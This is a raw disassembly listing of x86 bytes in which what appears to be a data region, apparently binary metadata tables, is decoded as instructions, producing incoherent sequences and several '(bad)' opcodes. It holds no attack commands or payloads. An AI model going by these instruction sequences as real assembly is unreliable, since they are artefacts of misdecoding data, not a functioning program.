  405c41:	00 01                	add    %al,(%ecx)
  405c43:	00 b6 11 00 00 02    	add    %dh,0x2000011(%esi)
  405c49:	00 c0                	add    %al,%al
  405c4b:	11 00                	adc    %eax,(%eax)
  405c4d:	00 03                	add    %al,(%ebx)
  405c4f:	00 93 11 00 00 04    	add    %dl,0x4000011(%ebx)
  405c55:	00 9c 11 00 00 01 00 	add    %bl,0x10000(%ecx,%edx,1)
  405c5c:	cb                   	lret
  405c5d:	11 00                	adc    %eax,(%eax)
  405c5f:	00 02                	add    %al,(%edx)
  405c61:	00 d4                	add    %dl,%ah
  405c63:	11 00                	adc    %eax,(%eax)
  405c65:	00 03                	add    %al,(%ebx)
  405c67:	00 de                	add    %bl,%dh
  405c69:	11 02                	adc    %eax,(%edx)
  405c6b:	20 04 00             	and    %al,(%eax,%eax,1)
  405c6e:	e9 11 00 00 05       	jmp    0x5405c84
  405c73:	00 ff                	add    %bh,%bh
  405c75:	11 00                	adc    %eax,(%eax)
  405c77:	00 06                	add    %al,(%esi)
  405c79:	00 07                	add    %al,(%edi)
  405c7b:	12 00                	adc    (%eax),%al
  405c7d:	00 01                	add    %al,(%ecx)
  405c7f:	00 0e                	add    %cl,(%esi)
  405c81:	12 00                	adc    (%eax),%al
  405c83:	00 02                	add    %al,(%edx)
  405c85:	00 13                	add    %dl,(%ebx)
  405c87:	12 00                	adc    (%eax),%al
  405c89:	00 03                	add    %al,(%ebx)
  405c8b:	00 1b                	add    %bl,(%ebx)
  405c8d:	12 00                	adc    (%eax),%al
  405c8f:	00 01                	add    %al,(%ecx)
  405c91:	00 93 11 00 00 02    	add    %dl,0x2000011(%ebx)
  405c97:	00 9c 11 00 00 03 00 	add    %bl,0x30000(%ecx,%edx,1)
  405c9e:	23 12                	and    (%edx),%edx
  405ca0:	00 00                	add    %al,(%eax)
  405ca2:	01 00                	add    %eax,(%eax)
  405ca4:	34 12                	xor    $0x12,%al
  405ca6:	00 00                	add    %al,(%eax)
  405ca8:	02 00                	add    (%eax),%al
  405caa:	3b 12                	cmp    (%edx),%edx
  405cac:	00 00                	add    %al,(%eax)
  405cae:	01 00                	add    %eax,(%eax)
  405cb0:	34 12                	xor    $0x12,%al
  405cb2:	00 00                	add    %al,(%eax)
  405cb4:	02 00                	add    (%eax),%al
  405cb6:	3b 12                	cmp    (%edx),%edx
  405cb8:	00 00                	add    %al,(%eax)
  405cba:	01 00                	add    %eax,(%eax)
  405cbc:	3d 12 00 00 01       	cmp    $0x1000012,%eax
  405cc1:	00 60 11             	add    %ah,0x11(%eax)
  405cc4:	00 00                	add    %al,(%eax)
  405cc6:	02 00                	add    (%eax),%al
  405cc8:	3b 12                	cmp    (%edx),%edx
  405cca:	00 00                	add    %al,(%eax)
  405ccc:	01 00                	add    %eax,(%eax)
  405cce:	43                   	inc    %ebx
  405ccf:	12 00                	adc    (%eax),%al
  405cd1:	00 02                	add    %al,(%edx)
  405cd3:	00 46 12             	add    %al,0x12(%esi)
  405cd6:	00 00                	add    %al,(%eax)
  405cd8:	01 00                	add    %eax,(%eax)
  405cda:	4f                   	dec    %edi
  405cdb:	12 00                	adc    (%eax),%al
  405cdd:	00 01                	add    %al,(%ecx)
  405cdf:	00 58 12             	add    %bl,0x12(%eax)
  405ce2:	00 00                	add    %al,(%eax)
  405ce4:	01 00                	add    %eax,(%eax)
  405ce6:	62 12                	bound  %edx,(%edx)
  405ce8:	00 00                	add    %al,(%eax)
  405cea:	01 00                	add    %eax,(%eax)
  405cec:	6c                   	insb   (%dx),%es:(%edi)
  405ced:	12 00                	adc    (%eax),%al
  405cef:	00 01                	add    %al,(%ecx)
  405cf1:	00 22                	add    %ah,(%edx)
  405cf3:	11 00                	adc    %eax,(%eax)
  405cf5:	00 02                	add    %al,(%edx)
  405cf7:	00 2a                	add    %ch,(%edx)
  405cf9:	11 00                	adc    %eax,(%eax)
  405cfb:	00 03                	add    %al,(%ebx)
  405cfd:	00 72 12             	add    %dh,0x12(%edx)
  405d00:	00 00                	add    %al,(%eax)
  405d02:	01 00                	add    %eax,(%eax)
  405d04:	22 11                	and    (%ecx),%dl
  405d06:	00 00                	add    %al,(%eax)
  405d08:	02 00                	add    (%eax),%al
  405d0a:	2a 11                	sub    (%ecx),%dl
  405d0c:	00 00                	add    %al,(%eax)
  405d0e:	03 00                	add    (%eax),%eax
  405d10:	7f 12                	jg     0x405d24
  405d12:	00 00                	add    %al,(%eax)
  405d14:	04 00                	add    $0x0,%al
  405d16:	87 12                	xchg   %edx,(%edx)
  405d18:	00 00                	add    %al,(%eax)
  405d1a:	01 00                	add    %eax,(%eax)
  405d1c:	22 11                	and    (%ecx),%dl
  405d1e:	00 00                	add    %al,(%eax)
  405d20:	02 00                	add    (%eax),%al
  405d22:	2a 11                	sub    (%ecx),%dl
  405d24:	00 00                	add    %al,(%eax)
  405d26:	03 00                	add    (%eax),%eax
  405d28:	ab                   	stos   %eax,%es:(%edi)
  405d29:	10 00                	adc    %al,(%eax)
  405d2b:	00 04 00             	add    %al,(%eax,%eax,1)
  405d2e:	8f                   	(bad)
  405d2f:	10 00                	adc    %al,(%eax)
  405d31:	00 05 00 95 12 00    	add    %al,0x129500
  405d37:	00 06                	add    %al,(%esi)
  405d39:	00 48 11             	add    %cl,0x11(%eax)
  405d3c:	00 00                	add    %al,(%eax)
  405d3e:	01 00                	add    %eax,(%eax)
  405d40:	22 11                	and    (%ecx),%dl
  405d42:	00 00                	add    %al,(%eax)
  405d44:	02 00                	add    (%eax),%al
  405d46:	2a 11                	sub    (%ecx),%dl
  405d48:	00 00                	add    %al,(%eax)
  405d4a:	03 00                	add    (%eax),%eax
  405d4c:	ab                   	stos   %eax,%es:(%edi)
  405d4d:	10 00                	adc    %al,(%eax)
  405d4f:	00 04 00             	add    %al,(%eax,%eax,1)
  405d52:	8f                   	(bad)
  405d53:	10 00                	adc    %al,(%eax)
  405d55:	00 01                	add    %al,(%ecx)
  405d57:	00 ac 12 00 00 02 00 	add    %ch,0x20000(%edx,%edx,1)
  405d5e:	bc 12 00 00 03       	mov    $0x3000012,%esp
  405d63:	00 50 11             	add    %dl,0x11(%eax)
  405d66:	00 00                	add    %al,(%eax)
  405d68:	01 00                	add    %eax,(%eax)
  405d6a:	50                   	push   %eax
  405d6b:	11 00                	adc    %eax,(%eax)
  405d6d:	00 01                	add    %al,(%ecx)
  405d6f:	00 2a                	add    %ch,(%edx)
  405d71:	11 00                	adc    %eax,(%eax)
  405d73:	00 01                	add    %al,(%ecx)
  405d75:	00 50 11             	add    %dl,0x11(%eax)
  405d78:	00 00                	add    %al,(%eax)
  405d7a:	01 00                	add    %eax,(%eax)
  405d7c:	ac                   	lods   %ds:(%esi),%al
  405d7d:	12 00                	adc    (%eax),%al
  405d7f:	00 02                	add    %al,(%edx)
  405d81:	00 bc 12 00 00 03 00 	add    %bh,0x30000(%edx,%edx,1)
  405d88:	50                   	push   %eax
  405d89:	11 00                	adc    %eax,(%eax)
  405d8b:	00 01                	add    %al,(%ecx)
  405d8d:	00 50 11             	add    %dl,0x11(%eax)
  405d90:	00 00                	add    %al,(%eax)
  405d92:	01 00                	add    %eax,(%eax)
  405d94:	cc                   	int3
  405d95:	12 00                	adc    (%eax),%al
  405d97:	00 02                	add    %al,(%edx)
  405d99:	00 d5                	add    %dl,%ch
  405d9b:	12 00                	adc    (%eax),%al
  405d9d:	00 01                	add    %al,(%ecx)
  405d9f:	00 2a                	add    %ch,(%edx)
  405da1:	11 00                	adc    %eax,(%eax)
  405da3:	00 01                	add    %al,(%ecx)
  405da5:	00 2a                	add    %ch,(%edx)
  405da7:	11 00                	adc    %eax,(%eax)
  405da9:	00 01                	add    %al,(%ecx)
  405dab:	00 dc                	add    %bl,%ah
  405dad:	12 00                	adc    (%eax),%al
  405daf:	00 02                	add    %al,(%edx)
  405db1:	00 5e 0c             	add    %bl,0xc(%esi)
  405db4:	00 00                	add    %al,(%eax)
  405db6:	01 00                	add    %eax,(%eax)
  405db8:	3b 10                	cmp    (%eax),%edx
  405dba:	00 00                	add    %al,(%eax)
  405dbc:	01 00                	add    %eax,(%eax)
  405dbe:	5e                   	pop    %esi
  405dbf:	0c 00                	or     $0x0,%al
  405dc1:	00 01                	add    %al,(%ecx)
  405dc3:	00 50 11             	add    %dl,0x11(%eax)
  405dc6:	00 00                	add    %al,(%eax)
  405dc8:	01 00                	add    %eax,(%eax)
  405dca:	50                   	push   %eax
  405dcb:	11 00                	adc    %eax,(%eax)
  405dcd:	00 01                	add    %al,(%ecx)
  405dcf:	00 50 11             	add    %dl,0x11(%eax)
  405dd2:	00 00                	add    %al,(%eax)
  405dd4:	01 00                	add    %eax,(%eax)
  405dd6:	50                   	push   %eax
  405dd7:	11 00                	adc    %eax,(%eax)
  405dd9:	00 01                	add    %al,(%ecx)
  405ddb:	00 50 11             	add    %dl,0x11(%eax)
  405dde:	00 00                	add    %al,(%eax)
  405de0:	01 00                	add    %eax,(%eax)
  405de2:	50                   	push   %eax
  405de3:	11 00                	adc    %eax,(%eax)
  405de5:	00 01                	add    %al,(%ecx)
  405de7:	00 50 11             	add    %dl,0x11(%eax)
  405dea:	00 00                	add    %al,(%eax)
  405dec:	01 00                	add    %eax,(%eax)
  405dee:	50                   	push   %eax
  405def:	11 00                	adc    %eax,(%eax)
  405df1:	00 01                	add    %al,(%ecx)
  405df3:	00 50 11             	add    %dl,0x11(%eax)
  405df6:	00 00                	add    %al,(%eax)
  405df8:	01 00                	add    %eax,(%eax)
  405dfa:	50                   	push   %eax
  405dfb:	11 00                	adc    %eax,(%eax)
  405dfd:	00 01                	add    %al,(%ecx)
  405dff:	00 50 11             	add    %dl,0x11(%eax)
  405e02:	00 00                	add    %al,(%eax)
  405e04:	01 00                	add    %eax,(%eax)
  405e06:	50                   	push   %eax
  405e07:	11 00                	adc    %eax,(%eax)
  405e09:	00 01                	add    %al,(%ecx)
  405e0b:	00 50 11             	add    %dl,0x11(%eax)
  405e0e:	00 00                	add    %al,(%eax)
  405e10:	01 00                	add    %eax,(%eax)
  405e12:	50                   	push   %eax
  405e13:	11 00                	adc    %eax,(%eax)
  405e15:	00 01                	add    %al,(%ecx)
  405e17:	00 e0                	add    %ah,%al
  405e19:	12 00                	adc    (%eax),%al
  405e1b:	00 01                	add    %al,(%ecx)
  405e1d:	00 34 12             	add    %dh,(%edx,%edx,1)
  405e20:	00 00                	add    %al,(%eax)
  405e22:	02 00                	add    (%eax),%al
  405e24:	3b 12                	cmp    (%edx),%edx
  405e26:	00 00                	add    %al,(%eax)
  405e28:	01 00                	add    %eax,(%eax)
  405e2a:	34 12                	xor    $0x12,%al
  405e2c:	00 00                	add    %al,(%eax)
  405e2e:	02 00                	add    (%eax),%al
  405e30:	3b 12                	cmp    (%edx),%edx
  405e32:	00 00                	add    %al,(%eax)
  405e34:	01 00                	add    %eax,(%eax)
  405e36:	34 12                	xor    $0x12,%al
  405e38:	00 00                	add    %al,(%eax)
  405e3a:	02 00                	add    (%eax),%al
  405e3c:	3b 12                	cmp    (%edx),%edx
  405e3e:	00 00                	add    %al,(%eax)
  405e40:	01 00                	add    %eax,(%eax)
  405e42:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  405e43:	1e                   	push   %ds
  405e44:	15 00 50 00 39       	adc    $0x39005000,%eax
  405e49:	01 4b 02             	add    %ecx,0x2(%ebx)
  405e4c:	e2 02                	loop   0x405e50
  405e4e:	49                   	dec    %ecx
  405e4f:	01 4b 02             	add    %ecx,0x2(%ebx)
  405e52:	35 00 51 01 4b       	xor    $0x4b015100,%eax
  405e57:	02 37                	add    (%edi),%dh
  405e59:	01 59 01             	add    %ebx,0x1(%ecx)
  405e5c:	4b                   	dec    %ebx
  405e5d:	02 37                	add    (%edi),%dh
  405e5f:	01 61 01             	add    %esp,0x1(%ecx)
  405e62:	4b                   	dec    %ebx
  405e63:	02 37                	add    (%edi),%dh
  405e65:	01 69 01             	add    %ebp,0x1(%ecx)
  405e68:	4b                   	dec    %ebx
  405e69:	02 37                	add    (%edi),%dh
  405e6b:	01 71 01             	add    %esi,0x1(%ecx)
  405e6e:	4b                   	dec    %ebx
  405e6f:	02 37                	add    (%edi),%dh
  405e71:	01 79 01             	add    %edi,0x1(%ecx)
  405e74:	4b                   	dec    %ebx
  405e75:	02 37                	add    (%edi),%dh
  405e77:	01 81 01 4b 02 37    	add    %eax,0x37024b01(%ecx)
  405e7d:	01 89 01 4b 02 37    	add    %ecx,0x37024b01(%ecx)
  405e83:	01 91 01 4b 02 f0    	add    %edx,-0xffdb4ff(%ecx)
  405e89:	00 99 01 4b 02 35    	add    %bl,0x35024b01(%ecx)
  405e8f:	00 a1 01 4b 02 37    	add    %ah,0x37024b01(%ecx)
  405e95:	01 41 00             	add    %eax,0x0(%ecx)
  405e98:	4b                   	dec    %ebx
  405e99:	02 ed                	add    %ch,%ch
  405e9b:	02 a9 01 52 14 f3    	add    -0xcebadff(%ecx),%ch
  405ea1:	02 b1 01 68 14 f8    	add    -0x7eb97ff(%ecx),%dh
  405ea7:	02 b9 01 76 14 3c    	add    0x3c147601(%ecx),%bh
  405ead:	00 09                	add    %cl,(%ecx)
  405eaf:	00 7b 14             	add    %bh,0x14(%ebx)
  405eb2:	33 01                	xor    (%ecx),%eax
  405eb4:	09 00                	or     %eax,(%eax)
  405eb6:	4b                   	dec    %ebx
  405eb7:	02 35 00 c1 01 4b    	add    0x4b01c100,%dh
  405ebd:	02 14 03             	add    (%ebx,%eax,1),%dl
  405ec0:	d1 01                	roll   $1,(%ecx)
  405ec2:	4b                   	dec    %ebx
  405ec3:	02 35 00 a9 01 b4    	add    0xb401a900,%dh
  405ec9:	14 3f                	adc    $0x3f,%al
  405ecb:	00 61 00             	add    %ah,0x0(%ecx)
  405ece:	4b                   	dec    %ebx
  405ecf:	02 1b                	add    (%ebx),%bl
  405ed1:	03 69 00             	add    0x0(%ecx),%ebp
  405ed4:	4b                   	dec    %ebx
  405ed5:	02 1b                	add    (%ebx),%bl
  405ed7:	03 29                	add    (%ecx),%ebp
  405ed9:	00 ba 14 35 00 29    	add    %bh,0x29003514(%edx)
  405edf:	00 4b 02             	add    %cl,0x2(%ebx)
  405ee2:	35 00 29 00 c0       	xor    $0xc0002900,%eax
  405ee7:	14 21                	adc    $0x21,%al
  405ee9:	03 29                	add    (%ecx),%ebp
  405eeb:	00 cc                	add    %cl,%ah
  405eed:	14 cf                	adc    $0xcf,%al
  405eef:	02 d9                	add    %cl,%bl
  405ef1:	01 e6                	add    %esp,%esi
  405ef3:	14 cf                	adc    $0xcf,%al
  405ef5:	02 79 00             	add    0x0(%ecx),%bh
  405ef8:	f2 14 ec             	repnz adc $0xec,%al
  405efb:	00 79 00             	add    %bh,0x0(%ecx)
  405efe:	fd                   	std
  405eff:	14 ec                	adc    $0xec,%al
  405f01:	00 79 00             	add    %bh,0x0(%ecx)
  405f04:	05 15 ec 00 79       	add    $0x7900ec15,%eax
  405f09:	00 0f                	add    %cl,(%edi)
  405f0b:	15 ec 00 0c 00       	adc    $0xc00ec,%eax
  405f10:	4b                   	dec    %ebx
  405f11:	02 1b                	add    (%ebx),%bl
  405f13:	03 0c 00             	add    (%eax,%eax,1),%ecx
  405f16:	18 15 2f 03 71 00    	sbb    %dl,0x71032f
  405f1c:	4b                   	dec    %ebx
  405f1d:	02 37                	add    (%edi),%dh
  405f1f:	03 69 00             	add    0x0(%ecx),%ebp
  405f22:	2f                   	das
  405f23:	15 f0 00 69 00       	adc    $0x6900f0,%eax
  405f28:	35 15 f0 00 61       	xor    $0x6100f015,%eax
  405f2d:	00 3b                	add    %bh,(%ebx)
  405f2f:	15 f0 00 61 00       	adc    $0x6100f0,%eax
  405f34:	46                   	inc    %esi
  405f35:	15 f0 00 e9 01       	adc    $0x1e900f0,%eax
  405f3a:	5a                   	pop    %edx
  405f3b:	15 5a 03 e9 01       	adc    $0x1e9035a,%eax
  405f40:	6c                   	insb   (%dx),%es:(%edi)
  405f41:	15 33 01 21 00       	adc    $0x210133,%eax
  405f46:	4b                   	dec    %ebx
  405f47:	02 35 00 f1 01 4b    	add    0x4b01f100,%dh
  405f4d:	02 60 03             	add    0x3(%eax),%ah
  405f50:	f9                   	stc
  405f51:	01 9f 15 66 03 f9    	add    %ebx,-0x6fc99eb(%edi)
  405f57:	01 c5                	add    %eax,%ebp
  405f59:	15 6d 03 e1 00       	adc    $0xe1036d,%eax
  405f5e:	4b                   	dec    %ebx
  405f5f:	02 35 00 09 02 4b    	add    0x4b020900,%dh
  405f65:	02 35 00 11 02 4b    	add    0x4b021100,%dh
  405f6b:	02 35 00 d9 01 e6    	add    0xe601d900,%dh
  405f71:	15 37 01 19 02       	adc    $0x2190137,%eax
  405f76:	4b                   	dec    %ebx
  405f77:	02 1b                	add    (%ebx),%bl
  405f79:	03 d9                	add    %ecx,%ebx
  405f7b:	01 f5                	add    %esi,%ebp
  405f7d:	15 74 03 21 02       	adc    $0x2210374,%eax
  405f82:	09 16                	or     %edx,(%esi)
  405f84:	7b 03                	jnp    0x405f89
  405f86:	21 02                	and    %eax,(%edx)
  405f88:	15 16 84 03 29       	adc    $0x29038416,%eax
  405f8d:	02 20                	add    (%eax),%ah
  405f8f:	16                   	push   %ss
  405f90:	ec                   	in     (%dx),%al
  405f91:	00 31                	add    %dh,(%ecx)
  405f93:	02 4b 02             	add    0x2(%ebx),%cl
  405f96:	1b 03                	sbb    (%ebx),%eax
  405f98:	d9 01                	flds   (%ecx)
  405f9a:	2a 16                	sub    (%esi),%dl
  405f9c:	8a 03                	mov    (%ebx),%al
  405f9e:	d9 01                	flds   (%ecx)
  405fa0:	3a 16                	cmp    (%esi),%dl
  405fa2:	cf                   	iret
  405fa3:	02 d9                	add    %cl,%bl
  405fa5:	01 59 16             	add    %ebx,0x16(%ecx)
  405fa8:	91                   	xchg   %eax,%ecx
  405fa9:	03 39                	add    (%ecx),%edi
  405fab:	02 66 16             	add    0x16(%esi),%ah
  405fae:	97                   	xchg   %eax,%edi
  405faf:	03 09                	add    (%ecx),%ecx
  405fb1:	02 6a 16             	add    0x16(%edx),%ch
  405fb4:	cf                   	iret
  405fb5:	02 d9                	add    %cl,%bl
  405fb7:	01 f2                	add    %esi,%edx
  405fb9:	14 ec                	adc    $0xec,%al
  405fbb:	00 d9                	add    %bl,%cl
  405fbd:	01 05 15 ec 00 d9    	add    %eax,0xd900ec15
  405fc3:	01 84 16 9e 03 b1 01 	add    %eax,0x1b1039e(%esi,%edx,1)
  405fca:	8e 16                	mov    (%esi),%ss
  405fcc:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  405fcd:	03 11                	add    (%ecx),%edx
  405fcf:	02 9d 16 ab 03 41    	add    0x4103ab16(%ebp),%bl
  405fd5:	02 b3 16 b1 03 29    	add    0x2903b116(%ebx),%dh
  405fdb:	00 b7 16 8a 03 39    	add    %dh,0x39038a16(%edi)
  405fe1:	02 c6                	add    %dh,%al
  405fe3:	16                   	push   %ss
  405fe4:	b7 03                	mov    $0x3,%bh
  405fe6:	29 00                	sub    %eax,(%eax)
  405fe8:	df 16                	fists  (%esi)
  405fea:	bf 03 29 00 05       	mov    $0x5002903,%edi
  405fef:	17                   	pop    %ss
  405ff0:	c6 03 59             	movb   $0x59,(%ebx)
  405ff3:	02 20                	add    (%eax),%ah
  405ff5:	17                   	pop    %ss
  405ff6:	cd 03                	int    $0x3
  405ff8:	59                   	pop    %ecx
  405ff9:	02 35 17 33 01 61    	add    0x61013317,%dh
  405fff:	02 47 17             	add    0x17(%edi),%al
  406002:	d3 03                	roll   %cl,(%ebx)
  406004:	29 00                	sub    %eax,(%eax)
  406006:	5d                   	pop    %ebp
  406007:	17                   	pop    %ss
  406008:	da 03                	fiaddl (%ebx)
  40600a:	29 00                	sub    %eax,(%eax)
  40600c:	66 17                	popw   %ss
  40600e:	cf                   	iret
  40600f:	02 29                	add    (%ecx),%ch
  406011:	00 76 17             	add    %dh,0x17(%esi)
  406014:	cf                   	iret
  406015:	02 29                	add    (%ecx),%ch
  406017:	00 95 17 e1 03 29    	add    %dl,0x2903e117(%ebp)
  40601d:	00 a6 17 e1 03 29    	add    %ah,0x2903e117(%esi)
  406023:	00 b7 17 e8 03 d9    	add    %dh,-0x26fc17e9(%edi)
  406029:	01 c2                	add    %eax,%edx
  40602b:	17                   	pop    %ss
  40602c:	33 01                	xor    (%ecx),%eax
  40602e:	14 00                	adc    $0x0,%al
  406030:	cb                   	lret
  406031:	17                   	pop    %ss
  406032:	ec                   	in     (%dx),%al
  406033:	00 79 02             	add    %bh,0x2(%ecx)
  406036:	4b                   	dec    %ebx
  406037:	02 35 00 14 00 f7    	add    0xf7001400,%dh
  40603d:	17                   	pop    %ss
  40603e:	0f 04                	(bad)
  406040:	1c 00                	sbb    $0x0,%al
  406042:	05 18 21 04 71       	add    $0x71042118,%eax
  406047:	02 4b 02             	add    0x2(%ebx),%cl
  40604a:	35 00 a1 00 11       	xor    $0x1100a100,%eax
  40604f:	18 33                	sbb    %dh,(%ebx)
  406051:	01 71 02             	add    %esi,0x2(%ecx)
  406054:	1b 18                	sbb    (%eax),%ebx
  406056:	cf                   	iret
  406057:	02 d9                	add    %cl,%bl
  406059:	01 20                	add    %esp,(%eax)
  40605b:	16                   	push   %ss
  40605c:	ec                   	in     (%dx),%al
  40605d:	00 d9                	add    %bl,%cl
  40605f:	01 27                	add    %esp,(%edi)
  406061:	18 ec                	sbb    %ch,%ah
  406063:	00 d9                	add    %bl,%cl
  406065:	01 3b                	add    %edi,(%ebx)
  406067:	15 f0 00 d9 01       	adc    $0x1d900f0,%eax
  40606c:	46                   	inc    %esi
  40606d:	15 f0 00 a1 00       	adc    $0xa100f0,%eax
  406072:	32 18                	xor    (%eax),%bl
  406074:	33 01                	xor    (%ecx),%eax
  406076:	79 02                	jns    0x40607a
  406078:	42                   	inc    %edx
  406079:	18 26                	sbb    %ah,(%esi)
  40607b:	04 89                	add    $0x89,%al
  40607d:	02 6c 18 06          	add    0x6(%eax,%ebx,1),%ch
  406081:	01 91 02 81 18 35    	add    %edx,0x35188102(%ecx)
  406087:	00 79 02             	add    %bh,0x2(%ecx)
  40608a:	89 18                	mov    %ebx,(%eax)
  40608c:	cf                   	iret
  40608d:	02 71 02             	add    0x2(%ecx),%dh
  406090:	98                   	cwtl
  406091:	18 06                	sbb    %al,(%esi)
  406093:	01 41 00             	add    %eax,0x0(%ecx)
  406096:	4b                   	dec    %ebx
  406097:	02 f0                	add    %al,%dh
  406099:	00 a1 02 4b 02 65    	add    %ah,0x65024b02(%ecx)
  40609f:	04 d9                	add    $0xd9,%al
  4060a1:	01 b9 18 6b 04 d9    	add    %edi,-0x26fb94e8(%ecx)
  4060a7:	01 c5                	add    %eax,%ebp
  4060a9:	18 6b 04             	sbb    %ch,0x4(%ebx)
  4060ac:	b1 00                	mov    $0x0,%cl
  4060ae:	cf                   	iret
  4060af:	18 ec                	sbb    %ch,%ah
  4060b1:	00 81 00 dc 18 f0    	add    %al,-0xfe72400(%ecx)
  4060b7:	00 b1 00 ef 18 72    	add    %dh,0x7218ef00(%ecx)
  4060bd:	04 b1                	add    $0xb1,%al
  4060bf:	00 fb                	add    %bh,%bl
  4060c1:	18 06                	sbb    %al,(%esi)
  4060c3:	01 b1 00 05 19 06    	add    %esi,0x6190500(%ecx)
  4060c9:	01 b1 00 0d 19 06    	add    %esi,0x6190d00(%ecx)
  4060cf:	01 a9 01 19 19 77    	add    %ebp,0x77191901(%ecx)
  4060d5:	04 81                	add    $0x81,%al
  4060d7:	00 23                	add    %ah,(%ebx)
  4060d9:	19 7c 04 81          	sbb    %edi,-0x7f(%esp,%eax,1)
  4060dd:	00 31                	add    %dh,(%ecx)
  4060df:	19 cf                	sbb    %ecx,%edi
  4060e1:	02 81 00 4e 19 81    	add    -0x7ee6b200(%ecx),%al
  4060e7:	04 81                	add    $0x81,%al
  4060e9:	00 62 19             	add    %ah,0x19(%edx)
  4060ec:	88 04 b1             	mov    %al,(%ecx,%esi,4)
  4060ef:	00 76 19             	add    %dh,0x19(%esi)
  4060f2:	72 04                	jb     0x4060f8
  4060f4:	c9                   	leave
  4060f5:	00 84 19 8e 04 c9 00 	add    %al,0xc9048e(%ecx,%ebx,1)
  4060fc:	8e 19                	mov    (%ecx),%ds
  4060fe:	8e 04 c9             	mov    (%ecx,%ecx,8),%es
  406101:	00 97 19 8e 04 b1    	add    %dl,-0x4efb71e7(%edi)
  406107:	02 b0 19 93 04 c9    	add    -0x36fb6ce7(%eax),%dh
  40610d:	00 b9 19 8e 04 c9    	add    %bh,-0x36fb71e7(%ecx)
  406113:	00 c5                	add    %al,%ch
  406115:	19 8e 04 c9 00 cd    	sbb    %ecx,-0x32ff36fc(%esi)
  40611b:	19 8e 04 c9 00 d7    	sbb    %ecx,-0x28ff36fc(%esi)
  406121:	19 8e 04 d9 01 e2    	sbb    %ecx,-0x1dfe26fc(%esi)
  406127:	19 35 00 b9 02 02    	sbb    %esi,0x202b900
  40612d:	1a cf                	sbb    %bh,%cl
  40612f:	02 d9                	add    %cl,%bl
  406131:	01 11                	add    %edx,(%ecx)
  406133:	1a 9e 04 29 00 1f    	sbb    0x1f002904(%esi),%bl
  406139:	1a cf                	sbb    %bh,%cl
  40613b:	02 d9                	add    %cl,%bl
  40613d:	01 2e                	add    %ebp,(%esi)
  40613f:	1a 35 00 c1 02 4b    	sbb    0x4b02c100,%dh
  406145:	02 65 04             	add    0x4(%ebp),%ah
  406148:	b9 00 4f 1a a4       	mov    $0xa41a4f00,%ecx
  40614d:	04 b9                	add    $0xb9,%al
  40614f:	00 5b 1a             	add    %bl,0x1a(%ebx)
  406152:	21 03                	and    %eax,(%ebx)
  406154:	b9 00 68 1a cf       	mov    $0xcf1a6800,%ecx
  406159:	02 b9 00 76 1a 35    	add    0x351a7600(%ecx),%bh
  40615f:	00 24 00             	add    %ah,(%eax,%eax,1)
  406162:	7c 1a                	jl     0x40617e
  406164:	b2 04                	mov    $0x4,%dl
  406166:	e9 00 85 1a f0       	jmp    0xf05ae66b
  40616b:	00 d9                	add    %bl,%cl
  40616d:	01 8f 1a 35 00 d9    	add    %ecx,-0x26ffcae6(%edi)
  406173:	01 97 1a f0 00 d9    	add    %edx,-0x26ff0fe6(%edi)
  406179:	01 a0 1a f0 00 d9    	add    %esp,-0x26ff0fe6(%eax)
  40617f:	01 ad 1a b8 04 c9    	add    %ebp,-0x36fb47e6(%ebp)
  406185:	02 4b 02             	add    0x2(%ebx),%cl
  406188:	be 04 d9 01 c0       	mov    $0xc001d904,%esi
  40618d:	1a c8                	sbb    %al,%cl
  40618f:	04 e9                	add    $0xe9,%al
  406191:	00 4b 02             	add    %cl,0x2(%ebx)
  406194:	35 00 e9 00 da       	xor    $0xda00e900,%eax
  406199:	1a cf                	sbb    %bh,%cl
  40619b:	04 d9                	add    $0xd9,%al
  40619d:	01 e4                	add    %esp,%esp
  40619f:	1a 9e 04 d9 01 f2    	sbb    -0xdfe26fc(%esi),%bl
  4061a5:	1a 8a 03 24 00 cb    	sbb    -0x34ffdbfd(%edx),%cl
  4061ab:	17                   	pop    %ss
  4061ac:	ec                   	in     (%dx),%al
  4061ad:	00 b9 00 4b 02 35    	add    %bh,0x35024b00(%ecx)
  4061b3:	00 24 00             	add    %ah,(%eax,%eax,1)
  4061b6:	4b                   	dec    %ebx
  4061b7:	02 35 00 d9 00 fb    	add    0xfb00d900,%dh
  4061bd:	1a ec                	sbb    %ah,%ch
  4061bf:	00 d9                	add    %bl,%cl
  4061c1:	00 1d 1b d6 04 39    	add    %bl,0x3904d61b
  4061c7:	02 2c 1b             	add    (%ebx,%ebx,1),%ch
  4061ca:	97                   	xchg   %eax,%edi
  4061cb:	03 e9                	add    %ecx,%ebp
  4061cd:	02 81 18 35 00 24    	add    0x24003518(%ecx),%al
  4061d3:	00 53 1b             	add    %dl,0x1b(%ebx)
  4061d6:	f0 00 b9 00 5c 1b 35 	lock add %bh,0x351b5c00(%ecx)
  4061dd:	00 29                	add    %ch,(%ecx)
  4061df:	02 27                	add    (%edi),%ah
  4061e1:	18 ec                	sbb    %ch,%ah
  4061e3:	00 29                	add    %ch,(%ecx)
  4061e5:	00 f5                	add    %dh,%ch
  4061e7:	15 74 03 d9 00       	adc    $0xd90374,%eax
  4061ec:	61                   	popa
  4061ed:	1b ec                	sbb    %esp,%ebp
  4061ef:	00 24 00             	add    %ah,(%eax,%eax,1)
  4061f2:	66 16                	pushw  %ss
  4061f4:	dc 04 24             	faddl  (%esp)
  4061f7:	00 76 1b             	add    %dh,0x1b(%esi)
  4061fa:	e2 04                	loop   0x406200
  4061fc:	d9 00                	flds   (%eax)
  4061fe:	7d 1b                	jge    0x40621b
  406200:	33 01                	xor    (%ecx),%eax
  406202:	d9 00                	flds   (%eax)
  406204:	8a 1b                	mov    (%ebx),%bl
  406206:	33 01                	xor    (%ecx),%eax
  406208:	d9 00                	flds   (%eax)
  40620a:	a0 1b ec 00 d9       	mov    0xd900ec1b,%al
  40620f:	00 b4 1b ec 00 f1 02 	add    %dh,0x2f100ec(%ebx,%ebx,1)
  406216:	4b                   	dec    %ebx
  406217:	02 e9                	add    %cl,%ch
  406219:	04 f1                	add    $0xf1,%al
  40621b:	02 d2                	add    %dl,%dl
  40621d:	1b f0                	sbb    %eax,%esi
  40621f:	04 f1                	add    $0xf1,%al
  406221:	02 e7                	add    %bh,%ah
  406223:	1b ec                	sbb    %esp,%ebp
  406225:	00 f1                	add    %dh,%cl
  406227:	02 f3                	add    %bl,%dh
  406229:	1b ec                	sbb    %esp,%ebp
  40622b:	00 a9 01 ff 1b f4    	add    %ch,-0xbe400ff(%ecx)
  406231:	04 a9                	add    $0xa9,%al
